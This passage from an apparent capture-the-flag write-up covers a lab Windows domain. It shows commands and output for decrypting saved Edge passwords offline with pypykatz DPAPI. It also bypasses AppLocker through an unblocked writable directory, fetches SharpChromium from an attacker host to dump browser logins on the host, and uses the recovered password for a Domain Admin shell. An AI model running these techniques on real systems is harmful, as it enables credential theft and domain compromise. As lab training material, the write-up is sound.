RFBBUEkBAAAA0Iyd3wEV0RGMegDAT8KX6wEAAAAJEL2orPLKQ5JmjgKfUD4REAAAAAoAAABFAGQAZwBlAAAAA2YAAMAAAAAQAAAAERo760RqlJ/1NQi4Mzu/ZgAAAAAEgAAAoAAAABAAAAAWAlikfH8o+jE6a5gX3L2aKAAAACAUAaTmAnujTfLRzhFqjgv7O9AUtBxQzQK2W+gZfUU0M8NHuoRD4a4UAAAAjFmocvQLwq3PeEzWRbAz1o7pQWM=

```

#### Identify / Extract Keyfile

That key is encrypted with Microsoft DPAPI, using one of the key files I noted above. To see which one, I’ll extract the DPAPI encrypted blob, and use [pypykatz](https://github.com/skelsec/pypykatz):

```

oxdf@hacky$ cat localstate | jq -r .os_crypt.encrypted_key | base64 -d | cut -c6- > blob
oxdf@hacky$ pypykatz dpapi describe blob blob 
== DPAPI_BLOB ==
version: 1 
credential_guid: b'\xd0\x8c\x9d\xdf\x01\x15\xd1\x11\x8cz\x00\xc0O\xc2\x97\xeb' 
masterkey_version: 1 
masterkey_guid: a8bd1009-f2ac-43ca-9266-8e029f503e11 
...[snip]...

```

That GUID matches one of the files in the `Protect` folder shown above. I could also just skip this step and try both key files.

I’ll use `certutil` to base64-encode that file, copy the results, paste it on my machine and decode it to get that binary file on my system.

#### Decrypt

To decrypt these logins, I’ll need to run four steps:
1. Use the SID and password for the user to generate “prekeys”.
2. Use the prekeys to decrypt the master password.
3. Use the master password to decrypt the Edge password from `Local State`.
4. Use the Edge password to decrypt the login data.

Step 1 is run with the `prekey` subcommand in `pypykatz`:

```

oxdf@hacky$ pypykatz dpapi prekey password 'S-1-5-21-1844305427-4058123335-2739572863-2761' '!@p%i&J#iNNo1T2' | tee pkf
4ea57b2e9e19cb91226b1ce0f64e4edad3d56c82
0fcd9d392606c1dbf84c875dcfad678ca56cb607
202e6812a189277e0ccd0bc72dcfdd4ed6e9469e

```

It generates three prekeys, which I save to a file `pkf` using `tee`.

Step 2 is to give the file with the prekeys to `masterkey` along with the GUID file from `Protect` to generate a file containing the master key:

```

oxdf@hacky$ pypykatz dpapi masterkey a8bd1009-f2ac-43ca-9266-8e029f503e11 pkf -o mkf
oxdf@hacky$ cat mkf
{
    "backupkeys": {},
    "masterkeys": {
        "a8bd1009-f2ac-43ca-9266-8e029f503e11": "930b9acfcf2f581cdb9929c1ed7e9ace387ce63f95e4f9e0c5b48e43d5c36bc8f2d84056195d9b02b681c98beafb090a2cdc51e799a22f863d3ad227746e0066"
    }
}

```

The result is a JSON file with a master key in it.

Step 3 and step 4 are carried out with the `chrome` subcommand, giving it the location of the `Local State` and `Login Data` files, as well as the file with the master key:

```

oxdf@hacky$ pypykatz dpapi chrome --logindata logindata mkf localstate
file: logindata user: bob.wood@windcorp.htb pass: b'SemTro\xc2\xa432756Gff' url: http://somewhere.com/action_page.php
file: logindata user: bob.wood@windcorp.htb pass: b'SomeSecurePasswordIGuess!09' url: http://google.com/action_page.php
file: logindata user: bob.woodADM@windcorp.com pass: b'smeT-Worg-wer-m024' url: http://webmail.windcorp.com/action_page.php

```

It uses the master key to decrypt the Edge specific key in `Local State`, and that key to decrypt the three passwords in `Login Data`.

### On Sekhmet [Method 2]

#### AppLocker Enumeration

To this point, I’ve guessed that AppLocker is blocking exes at a couple points. To move forward, I need to understand what the AppLocker policy is.

I’ll pull it with `Get-AppLockerPolicy`:

```
*Evil-WinRM* PS C:\Users\Bob.Wood\Documents> get-applockerpolicy -effective -xml
<AppLockerPolicy Version="1"><RuleCollection Type="Appx" EnforcementMode="Enabled"><FilePublisherRule Id="a9e18c21-ff8f-43cf-b9fc-db40eed693ba" Name="(Default Rule) All signed packaged apps" Description="Allows members of the Everyone group to run packaged apps that are signed." UserOrGroupSid="S-1-1-0"                                                   Action="Allow"><Conditions><FilePublisherCondition PublisherName="*" ProductName="*" BinaryName="*"><BinaryVersionRange LowSection="0.0.0.0" HighSection="*" /></FilePublisherCondition></Conditions></FilePublisherRule></RuleCollection><RuleCollection Type="Dll" EnforcementMode="Enabled"><FilePublisherRule Id="5b74e91f-e7d9-4348-a21b-047d2901c659"        Name="Signed by O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" Description="" UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="*" BinaryName="*"><BinaryVersionRange LowSection="*" HighSection="*" /></FilePublisherCondition></          Conditions></FilePublisherRule><FilePathRule Id="a6651628-328a-4beb-9ff3-7c94e84b0ff4" Name="Microsoft Windows DLLs" Description="Allows members of the Everyone group to load DLLs located in the Windows folder." UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePathCondition Path="%WINDIR%\*" /></Conditions><Exceptions><FilePathCondition Path="C:\Windows\Registration\CRMLog:*" /><FilePathCondition Path="C:\Windows\Registration\CRMLog\*" /><FilePathCondition Path="C:\Windows\System32\com\dmp:*" /><FilePathCondition Path="C:\Windows\System32\com\dmp\*" /><FilePathCondition Path="C:\Windows\System32\FxsTmp:*" /><FilePathCondition Path="C:\Windows\System32\FxsTmp\*" /><FilePathCondition Path="C:   \Windows\System32\Microsoft\Crypto\DSS\MachineKeys:*" /><FilePathCondition Path="C:\Windows\System32\Microsoft\Crypto\DSS\MachineKeys:\*" /><FilePathCondition Path="C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys:*" /><FilePathCondition Path="C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys\*" /><FilePathCondition Path="C:                      \Windows\System32\spool\drivers\color:*" /><FilePathCondition Path="C:\Windows\System32\spool\drivers\color\*" /><FilePathCondition Path="C:\Windows\System32\spool\PRINTERS:*" /><FilePathCondition Path="C:\Windows\System32\spool\PRINTERS\*" /><FilePathCondition Path="C:\Windows\System32\spool\SERVERS:*" /><FilePathCondition Path="C:                     \Windows\System32\spool\SERVERS\*" /><FilePathCondition Path="C:\Windows\System32\Tasks:*" /><FilePathCondition Path="C:\Windows\System32\Tasks\*" /><FilePathCondition Path="C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter:*" /><FilePathCondition Path="C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter\*" /><FilePathCondition Path="C:         \Windows\System32\Tasks\Microsoft\Windows\WindowsColorSystem\Calibration Loader:*" /><FilePathCondition Path="C:\Windows\System32\Tasks\Microsoft\Windows\WindowsColorSystem\Calibration Loader\*" /><FilePathCondition Path="C:\Windows\System32\Tasks_Migrated:*" /><FilePathCondition Path="C:\Windows\System32\Tasks_Migrated\*" /><FilePathCondition Path="C: \Windows\SysWOW64\com\dmp:*" /><FilePathCondition Path="C:\Windows\SysWOW64\com\dmp\*" /><FilePathCondition Path="C:\Windows\SysWOW64\FxsTmp:*" /><FilePathCondition Path="C:\Windows\SysWOW64\FxsTmp\*" /><FilePathCondition Path="C:\Windows\SysWOW64\Tasks:*" /><FilePathCondition Path="C:\Windows\SysWOW64\Tasks\*" /><FilePathCondition Path="C:             \Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System:*" /><FilePathCondition Path="C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System\*" /><FilePathCondition Path="C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter:*" /><FilePathCondition Path="C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter\*" /><FilePathCondition Path="c:               \windows\tasks:*" /><FilePathCondition Path="c:\windows\tasks\*" /><FilePathCondition Path="c:\windows\temp:*" /><FilePathCondition Path="c:\windows\temp\*" /><FilePathCondition Path="C:\windows\tracing:*" /><FilePathCondition Path="C:\windows\tracing\*" /></Exceptions></FilePathRule><FilePathRule Id="fc510e44-f0d2-46e8-b9a1-0f1e4bdb375b" Name="All     DLLs located in the Program Files folder" Description="Allows members of the Everyone group to load DLLs that are located in the Program Files folder." UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePathCondition Path="%PROGRAMFILES%\*" /></Conditions><Exceptions><FilePathCondition Path="C:\Program Files                                        (x86)\Microsoft\Edge\Application\SetupMetrics:*" /><FilePathCondition Path="C:\Program Files (x86)\Microsoft\Edge\Application\SetupMetrics\*" /></Exceptions></FilePathRule><FilePathRule Id="fe64f59f-6fca-45e5-a731-0f6715327c38" Name="(Default Rule) All DLLs" Description="Allows members of the local Administrators group to load all DLLs."                UserOrGroupSid="S-1-5-32-544" Action="Allow"><Conditions><FilePathCondition Path="*" /></Conditions></FilePathRule></RuleCollection><RuleCollection Type="Exe" EnforcementMode="Enabled"><FilePublisherRule Id="1c95e32b-8d77-4be3-a5ea-70fa8b33448f" Name="MSDT.EXE, in MICROSOFT® WINDOWS® OPERATING SYSTEM, from O=MICROSOFT CORPORATION, L=REDMOND,            S=WASHINGTON, C=US" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="MICROSOFT® WINDOWS® OPERATING SYSTEM" BinaryName="MSDT.EXE"><BinaryVersionRange LowSection="*" HighSection="*" /></FilePublisherCondition></Conditions></        FilePublisherRule><FilePublisherRule Id="2f48e4bf-fb10-4943-9ccf-3c38a33dff8a" Name="PRESENTATIONHOST.EXE, in MICROSOFT® WINDOWS® OPERATING SYSTEM, from O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND,      S=WASHINGTON, C=US" ProductName="MICROSOFT® WINDOWS® OPERATING SYSTEM" BinaryName="PRESENTATIONHOST.EXE"><BinaryVersionRange LowSection="*" HighSection="*" /></FilePublisherCondition></Conditions></FilePublisherRule><FilePublisherRule Id="8df6bb7a-165b-4e4c-9ef1-183012b46580" Name="MSHTA.EXE, in INTERNET EXPLORER, from O=MICROSOFT CORPORATION,          L=REDMOND, S=WASHINGTON, C=US" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="INTERNET EXPLORER" BinaryName="MSHTA.EXE"><BinaryVersionRange LowSection="*" HighSection="*" /></FilePublisherCondition></Conditions></               FilePublisherRule><FilePublisherRule Id="e673082a-e07c-4a37-a7ac-4a7d79423220" Name="Signed by O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" Description="" UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePublisherCondition PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US" ProductName="*" BinaryName="*             "><BinaryVersionRange LowSection="*" HighSection="*" /></FilePublisherCondition></Conditions></FilePublisherRule><FilePathRule Id="10c790e5-45d5-42d3-aaf1-fcd51f24593b" Name="%SYSTEM32%\regsvr32.exe" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\regsvr32.exe" /></Conditions></                      FilePathRule><FilePathRule Id="12562a49-2d24-48cf-af9f-46f4fe807464" Name="%WINDIR%\Microsoft.NET\assembly\GAC_32\MSBuild\v4.0_4.0.0.0__b03f5f7f11d50a3a\MSBuild.exe" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\Microsoft.NET\assembly\GAC_32\MSBuild\v4.0_4.0.0.0__b03f5f7f11d50a3a\MSBuild.exe" /></   Conditions></FilePathRule><FilePathRule Id="18635dba-5d58-40d5-9c90-12a3638088fa" Name="%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe" /></Conditions></FilePathRule><FilePathRule       Id="2c47f772-4d79-4493-b64b-613e17f0011c" Name="All files located in the Windows folder" Description="Allows members of the Everyone group to run applications that are located in the Windows folder." UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePathCondition Path="%WINDIR%\*" /></Conditions><Exceptions><FilePathCondition Path="C:            \Windows\Registration\CRMLog:*" /><FilePathCondition Path="C:\Windows\Registration\CRMLog\*" /><FilePathCondition Path="C:\Windows\System32\com\dmp:*" /><FilePathCondition Path="C:\Windows\System32\com\dmp\*" /><FilePathCondition Path="C:\Windows\System32\FxsTmp:*" /><FilePathCondition Path="C:\Windows\System32\FxsTmp\*" /><FilePathCondition Path="C:   \Windows\System32\Microsoft\Crypto\DSS\MachineKeys:*" /><FilePathCondition Path="C:\Windows\System32\Microsoft\Crypto\DSS\MachineKeys\*" /><FilePathCondition Path="C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys:*" /><FilePathCondition Path="C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys\*" /><FilePathCondition Path="C:                       \Windows\System32\spool\drivers\color:*" /><FilePathCondition Path="C:\Windows\System32\spool\drivers\color\*" /><FilePathCondition Path="C:\Windows\System32\spool\PRINTERS:*" /><FilePathCondition Path="C:\Windows\System32\spool\PRINTERS\*" /><FilePathCondition Path="C:\Windows\System32\spool\SERVERS:*" /><FilePathCondition Path="C:                     \Windows\System32\spool\SERVERS\*" /><FilePathCondition Path="C:\Windows\System32\Tasks:*" /><FilePathCondition Path="C:\Windows\System32\Tasks\*" /><FilePathCondition Path="C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter:*" /><FilePathCondition Path="C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter\*" /><FilePathCondition Path="C:         \Windows\System32\Tasks\Microsoft\Windows\WindowsColorSystem\Calibration Loader:*" /><FilePathCondition Path="C:\Windows\System32\Tasks\Microsoft\Windows\WindowsColorSystem\Calibration Loader\*" /><FilePathCondition Path="C:\Windows\System32\Tasks_Migrated:*" /><FilePathCondition Path="C:\Windows\System32\Tasks_Migrated\*" /><FilePathCondition Path="C: \Windows\SysWOW64\com\dmp:*" /><FilePathCondition Path="C:\Windows\SysWOW64\com\dmp\*" /><FilePathCondition Path="C:\Windows\SysWOW64\FxsTmp:*" /><FilePathCondition Path="C:\Windows\SysWOW64\FxsTmp\*" /><FilePathCondition Path="C:\Windows\SysWOW64\Tasks:*" /><FilePathCondition Path="C:\Windows\SysWOW64\Tasks\*" /><FilePathCondition Path="C:             \Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System:*" /><FilePathCondition Path="C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System\*" /><FilePathCondition Path="C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter:*" /><FilePathCondition Path="C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter\*" /><FilePathCondition Path="c:               \windows\tasks:*" /><FilePathCondition Path="c:\windows\tasks\*" /><FilePathCondition Path="c:\windows\temp:*" /><FilePathCondition Path="c:\windows\temp\*" /><FilePathCondition Path="C:\windows\tracing:*" /><FilePathCondition Path="C:\windows\tracing\*" /></Exceptions></FilePathRule><FilePathRule Id="33321360-5a7e-4d3d-8272-5d9ef3b5bda9"               Name="%WINDIR%\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe" /></Conditions></FilePathRule><FilePathRule Id="5e7475c4-3020-4a07-a837-ddbc314e9251" Name="%WINDIR%\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe" /></Conditions></FilePathRule><FilePathRule Id="7947e3d3-a885-49c2-b6ec-33a6810241cf" Name="%WINDIR%\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe" Description="" UserOrGroupSid="S-1-1-0"               Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe" /></Conditions></FilePathRule><FilePathRule Id="7ec6c256-f4cf-4fc3-a571-5464dcf4331e" Name="%WINDIR%\Microsoft.NET\assembly\GAC_64\MSBuild\v4.0_4.0.0.0__b03f5f7f11d50a3a\MSBuild.exe" Description="" UserOrGroupSid="S-1-1-0"                          Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\Microsoft.NET\assembly\GAC_64\MSBuild\v4.0_4.0.0.0__b03f5f7f11d50a3a\MSBuild.exe" /></Conditions></FilePathRule><FilePathRule Id="96589dd6-4d14-409d-96db-04d88ad8a211" Name="%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe" Description="" UserOrGroupSid="S-1-1-0"                        Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe" /></Conditions></FilePathRule><FilePathRule Id="999212fb-9894-4e2a-bcf0-a7dfd9ee20ec" Name="%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition           Path="%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" /></Conditions></FilePathRule><FilePathRule Id="9a90b589-423e-4b4a-8d5b-a4899259eb10" Name="%SYSTEM32%\regsvr32.exe" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\regsvr32.exe" /></Conditions></FilePathRule><FilePathRule Id="9e07096a-ed7c-47a1-b29a-85583454d8a8" Name="All files located in the Program Files folder" Description="Allows members of the Everyone group to run applications that are located in the Program Files folder." UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePathCondition Path="%PROGRAMFILES%\*" /></Conditions><Exceptions><FilePathCondition Path="C:       \Program Files (x86)\Microsoft\Edge\Application\SetupMetrics:*" /><FilePathCondition Path="C:\Program Files (x86)\Microsoft\Edge\Application\SetupMetrics\*" /></Exceptions></FilePathRule><FilePathRule Id="f6c5eb25-6b48-49a4-ad3a-1f8d2174ad2f" Name="%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\RegSvcs.exe" Description="" UserOrGroupSid="S-1-1-0"        Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\RegSvcs.exe" /></Conditions></FilePathRule><FilePathRule Id="fd686d83-a829-4351-8ff4-27c7de5755d2" Name="(Default Rule) All files" Description="Allows members of the local Administrators group to run all applications." UserOrGroupSid="S-1-5-32-544"          Action="Allow"><Conditions><FilePathCondition Path="*" /></Conditions></FilePathRule></RuleCollection><RuleCollection Type="Msi" EnforcementMode="Enabled"><FilePublisherRule Id="b7af7102-efde-4369-8a89-7a6a392d1473" Name="(Default Rule) All digitally signed Windows Installer files" Description="Allows members of the Everyone group to run digitally      signed Windows Installer files." UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePublisherCondition PublisherName="*" ProductName="*" BinaryName="*"><BinaryVersionRange LowSection="0.0.0.0" HighSection="*" /></FilePublisherCondition></Conditions></FilePublisherRule><FilePathRule Id="5b290184-345a-4453-b184-45305f6d9a54" Name="(Default Rule)    All Windows Installer files in %systemdrive%\Windows\Installer" Description="Allows members of the Everyone group to run all Windows Installer files located in %systemdrive%\Windows\Installer." UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePathCondition Path="%WINDIR%\Installer\*" /></Conditions></FilePathRule><FilePathRule Id="64ad46ff-0d71-4fa0-a30b-3f3d30c5433d" Name="(Default Rule) All Windows Installer files" Description="Allows members of the local Administrators group to run all Windows Installer files." UserOrGroupSid="S-1-5-32-544" Action="Allow"><Conditions><FilePathCondition Path="*.*" /></Conditions></FilePathRule></RuleCollection><RuleCollection Type="Script"                   EnforcementMode="Enabled"><FilePathRule Id="01eef8b9-7be3-405e-8bec-0eb6e1ab05f0" Name="All scripts located in the Windows folder" Description="Allows members of the Everyone group to run scripts that are located in the Windows folder." UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePathCondition Path="%WINDIR%\*" /></                         Conditions><Exceptions><FilePathCondition Path="C:\Windows\Registration\CRMLog :*" /><FilePathCondition Path="C:\Windows\Registration\CRMLog\*" /><FilePathCondition Path="C:\Windows\System32\com\dmp:*" /><FilePathCondition Path="C:\Windows\System32\com\dmp\*" /><FilePathCondition Path="C:\Windows\System32\FxsTmp:*" /><FilePathCondition Path="C:         \Windows\System32\FxsTmp\*" /><FilePathCondition Path="C:\Windows\System32\Microsoft\Crypto\DSS\MachineKeys:*" /><FilePathCondition Path="C:\Windows\System32\Microsoft\Crypto\DSS\MachineKeys\*" /><FilePathCondition Path="C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys:*" /><FilePathCondition Path="C:                                                 \Windows\System32\Microsoft\Crypto\RSA\MachineKeys\*" /><File PathCondition Path="C:\Windows\System32\spool\drivers\color:*" /><FilePathCondition Path="C:\Windows\System32\spool\drivers\color\*" /><FilePathCondition Path="C:\Windows\System32\spool\PRINTERS:*" /><FilePathCondition Path="C:\Windows\System32\spool\PRINTERS\*" /><FilePathCondition Path="C: \Windows\System32\spool\SERVERS:*" /><FilePathCondition Path="C:\Windows\System32\spool\SERVERS\*" /><FilePathCondition Path="C:\Windows\System32\Tasks:*" /><FilePathCondition Path="C:\Windows\System32\Tasks\*" /><FilePathCondition Path="C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter:*" /><FilePathCondition Path="C:                              \Windows\System32\Tasks\Microsoft\Windows\SyncCenter\*" /><FilePathCondition Path="C:\Windows\System32\Tasks\Microsoft\Windows\WindowsColorSystem\Calibration Loader:*" /><FilePathCondition Path="C:\Windows\System32\Tasks\Microsoft\Windows\WindowsColorSystem\Calibration Loader\*" /><FilePathCondition Path="C:\Windows\System32\Tasks_Migrated:*" /         ><FilePathCondition Path="C:\Windows\System32\Tasks_Migrated\*" /><FilePathCondition Path="C:\Windows\SysWOW64\com\dmp:*" /><FilePathCondition Path="C:\Windows\SysWOW64\com\dmp\*" /><FilePathCondition Path="C:\Windows\SysWOW64\FxsTmp:*" /><FilePathCondition Path="C:\Windows\SysWOW64\FxsTmp\*" /><FilePath Condition Path="C:\Windows\SysWOW64\Tasks:*" /   ><FilePathCondition Path="C:\Windows\SysWOW64\Tasks\*" /><FilePathCondition Path="C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System:*" /><FilePathCondition Path="C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System\*" /><FilePathCondition Path="C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter:*" /><FilePathCondition Path="C:                \Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter\*" /><FilePathCondition Path="c:\windows\tasks:*" /><FilePathCondition Path="c:\windows\tasks\*" /><FilePathCondition Path="c:\windows\temp:*" /><FilePathCondition Path="c:\windows\temp\*" /><File PathCondition Path="C:\windows\tracing:*" /><FilePathCondition Path="C:\windows\tracing\*" /></          Exceptions></FilePathRule><FilePathRule Id="0ed89ea4-cb79-4559-b1ba-2d8239966046" Name="All scripts located in the Program Files folder" Description="Allows members of the Everyone group to run scripts that are located in the Program Files folder." UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePathCondition Path="%PROGRAMFILES%\*" /></       Conditions><Exceptions><FilePathCondition Path="C:\Program Files (x86)\Microsoft\Edge\Application\SetupMetrics:*" /><FilePathCondition Path="C:\Program Files (x86)\Microsoft\Edge\Application\SetupMetrics\*" /></Exceptions></FilePathRule><FilePathRule Id="ed97d0cb-15ff-430f-b82c-8d7832957725" Name="(Default Rule) All scripts" Description="Allows members of the local Administrators group to run all scripts." UserOrGroupSid="S-1-5-32-544" Action="Allow"><Conditions><FilePathCondition Path="*" /></Conditions></FilePathRule><FileHashRule Id="f692eb73-3d96-4b6a-b187-86854a6e72ee" Name="UserMobile.ps1" Description="" UserOrGroupSid="S-1-5-21-1844305427-4058123335-2739572863-3604"                             Action="Allow"><Conditions><FileHashCondition><FileHash Type="SHA256" Data="0xCA01719FE8911B65096D5F29BB14574338B4DF9273D9A621F92E3A5C080DB63F" SourceFileName="UserMobile.ps1" SourceFileLength="445" /></FileHashCondition></Conditions></FileHashRule></RuleCollection></AppLockerPolicy>

```

I go over how to format this into something more readable in [the second part of this video](https://youtu.be/w_Kro3S4xE8?t=327) that I made when Hathor retired:

The first goal is to find a place on Sekhmet that bob.wood can write that isn’t blocked in these rules. I spent a little bit of time trying to write a command to look for writable directories, but between constrained language mode and other failures, didn’t get far.

The rules for EXEs allow that any user can run files from `%WINDIR%\*`, except for things that are blocked:

![image-20230330101642322](/img/image-20230330101642322.png)

The block list is quite long. Looking for common directories, I stumble across [this GitHub Gist](https://gist.github.com/mattifestation/5f9de750470c9e0e1f9c9c33f0ec3e56) which has a short list of world writable directories:

```

c:\windows\system32\microsoft\crypto\rsa\machinekeys
c:\windows\system32\tasks_migrated\microsoft\windows\pla\system
c:\windows\syswow64\tasks\microsoft\windows\pla\system
c:\windows\debug\wia
c:\windows\system32\tasks
c:\windows\syswow64\tasks
c:\windows\tasks
c:\windows\registration\crmlog
c:\windows\system32\com\dmp
c:\windows\system32\fxstmp
c:\windows\system32\spool\drivers\color
c:\windows\system32\spool\printers
c:\windows\system32\spool\servers
c:\windows\syswow64\com\dmp
c:\windows\syswow64\fxstmp
c:\windows\temp
c:\windows\tracing

```

Comparing that to the blocked list in the AppLocker data, `C:\windows\debug\wia` isn’t blocked. I’ll try it, and I can write to it:

```
*Evil-WinRM* PS C:\windows\debug\wia> echo "0xdf was here" > test
*Evil-WinRM* PS C:\windows\debug\wia> type test
0xdf was here

```

I’ll copy `cmd.exe` into this directory, and it runs:

```
*Evil-WinRM* PS C:\windows\debug\wia> copy \windows\system32\cmd.exe c.exe
*Evil-WinRM* PS C:\windows\debug\wia> .\c.exe /c echo "this is running!"
"this is running!"

```

#### SharpChromium

[SharpChromium](https://github.com/djhohnstein/SharpChromium) is a .NET exe that will extract cookies and login data from Chrome. I’ll download a compiled version from [SharpCollection](https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.5_Any/SharpChromium.exe) and upload it to Sekhmet, and it runs:

```
*Evil-WinRM* PS C:\windows\debug\wia> iwr http://10.10.14.6/SharpChromium.exe -outfile scium.exe
*Evil-WinRM* PS C:\windows\debug\wia> .\scium.exe

Usage:
    .\SharpChromium.exe arg0 [arg1 arg2 ...]

Arguments:
    all       - Retrieve all Chromium Cookies, History and Logins.
    full      - The same as 'all'
    logins    - Retrieve all saved credentials that have non-empty passwords.
    history   - Retrieve user's history with a count of each time the URL was
                visited, along with cookies matching those items.
    cookies [domain1.com domain2.com] - Retrieve the user's cookies in JSON format.
                                        If domains are passed, then return only
                                        cookies matching those domains. Otherwise,
                                        all cookies are saved into a temp file of
                                        the format "%TEMP%\$browser-cookies.json"

```

Giving it the `logins` command will dump the same data as the offline strategy:

```
*Evil-WinRM* PS C:\windows\debug\wia> .\scium.exe logins
[*] Beginning Edge extraction.
--- Chromium Credential (User: Bob.Wood) ---
URL      : http://somewhere.com/action_page.php
Username : bob.wood@windcorp.htb
Password : SemTro32756Gff
--- Chromium Credential (User: Bob.Wood) ---
URL      : http://google.com/action_page.php
Username : bob.wood@windcorp.htb
Password : SomeSecurePasswordIGuess!09
--- Chromium Credential (User: Bob.Wood) ---
URL      : http://webmail.windcorp.com/action_page.php
Username : bob.woodADM@windcorp.com
Password : smeT-Worg-wer-m024

[*] Finished Edge extraction.

[*] Done.

```

### Shell

One of the saved logins is for `bob.woodADM@windcorp.com` on `webmail.windcorp.com`. That seems to be bob.wood’s admin account. Given that it’s for webmail on the domain (I’m assuming this is supposed to be `.htb` not `.com`), then it’s likely this is that user’s domain password.

I’ll run `kinit` to get a ticket as this user with this password, and connect over Evil-WinRM:

```

oxdf@hacky$ proxychains kinit bob.woodadm
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Password for bob.woodadm@WINDCORP.HTB: 
oxdf@hacky$ proxychains evil-winrm -i hope.windcorp.htb -r windcorp.htb
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\bob.woodadm\Documents>

```

bob.woodADM is in the Domain Admins group:

```
*Evil-WinRM* PS C:\Users\bob.woodadm\Documents> whoami /groups
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.0.2:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.0.2:5985  ...  OK

GROUP INFORMATION
-----------------

Group Name                                      Type             SID                                           Attributes
=============================================== ================ ============================================= ===============================================================
Everyone                                        Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                   Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access      Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                          Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner
NT AUTHORITY\NETWORK                            Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                  Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
